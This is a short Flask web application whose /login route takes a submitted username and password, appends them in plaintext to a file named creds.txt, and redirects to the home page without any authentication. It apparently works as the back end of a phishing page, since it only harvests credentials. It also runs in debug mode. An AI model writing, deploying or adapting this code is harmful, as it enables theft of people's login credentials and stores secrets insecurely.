from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Route for the home page
@app.route('/')
def home():
    return render_template('index.html')

# Route to handle form submission
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save credentials to creds.txt
    with open('creds.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')

    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
